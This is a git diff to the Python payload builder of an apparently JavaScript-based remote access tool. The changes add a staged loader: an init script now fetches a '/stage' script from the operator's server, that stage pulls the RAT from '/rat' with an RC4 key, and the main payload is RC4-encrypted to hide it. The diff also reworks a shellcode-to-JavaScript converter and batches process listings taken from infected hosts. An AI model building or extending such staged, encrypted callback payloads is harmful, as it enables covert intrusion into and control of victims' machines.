@@ -2,9 +2,9 @@
 # coding:utf-8
 from base64 import b64decode, b64encode
 from binascii import unhexlify
-import os
 from .color import BOLD
 from .log import Log
+from .cipher import ARC4
 
 
 def load_template_js(template_name):
@@ -42,7 +42,15 @@ class Payload():
     def init(cls, server_addr, server_port):
         context = load_template_js('template/init.js')
         context = var_process(
-            context, {'~URL_RAT~': 'http://{}:{}/rat'.format(server_addr, server_port)})
+            context, {'~URL_STAGE~': 'http://{}:{}/stage'.format(server_addr, server_port)})
+
+        return context.encode()
+
+    @classmethod
+    def stage(cls, server_addr, server_port,rc4_key):
+        context = load_template_js('template/stage.js')
+        context = var_process(
+            context, {'~URL_RAT~': 'http://{}:{}/rat'.format(server_addr, server_port), '~KEY~': rc4_key})
 
         return context.encode()
 
@@ -52,8 +60,9 @@ class Payload():
         js_vars = {'~URL_RUN~': 'http://{}:{}'.format(
             server_addr, server_port), '~KEY~': rc4_key, '~SLEEP~': str(sleep_time)}
         context = var_process(context, js_vars)
+        context = ARC4.encrypt(context.encode(),rc4_key.encode())
 
-        return context.encode()
+        return context#.encode()
 
     @classmethod
     def regsvr(cls, server_addr, server_port):
@@ -69,13 +78,7 @@ class Payload():
     Forked from Koaidc shellcode_dotnet2js.py
     '''
 
-    def __shellcode_b64(self, path):
-        if os.path.isfile(path):
-            with open(path, 'rb') as fileobj:
-                text = b64encode(fileobj.read()).decode()
-        else:
-            text = path
-
+    def __shellcode_b64(self, text):
         index = 0
         ret = '"'
         for c in text:
@@ -190,16 +193,19 @@ class Payload():
             p.append({'start': col_start, 'end': col_start+len(c)})
             col_start += len(c)+1
 
-        Log.log_message('{:<25} {:>8} {:<16} {:<40} {:<40}'.format('IMAGE',
-                                                                   'PID', 'SESSION', 'USER', 'CMDLINE'), log_type=Log.JOB_RES)
+        message = []
+        message.append('{:<25} {:>8} {:<16} {:<40} {:<40}'.format('IMAGE',
+                                                                  'PID', 'SESSION', 'USER', 'CMDLINE'))
         for line in lines:
             image = line[p[0]['start']:p[0]['end']]
             pid = line[p[1]['start']:p[1]['end']]
             session = line[p[2]['start']:p[2]['end']]
             user = line[p[6]['start']:p[6]['end']]
             cmdline = line[p[8]['start']:p[8]['end']]
-            Log.log_message('{:<25} {:>8} {:<16} {:<40} {:<40}'.format(image.strip(), pid.strip(
-            ), session.strip(), user.strip(), cmdline.strip()), log_type=Log.JOB_RES)
+            message.append('{:<25} {:>8} {:<16} {:<40} {:<40}'.format(image.strip(), pid.strip(
+            ), session.strip(), user.strip(), cmdline.strip()))
+
+        Log.log_message('\n'.join(message), log_type=Log.JOB_RES)
 
     '''
     对任务返回数据进行处理
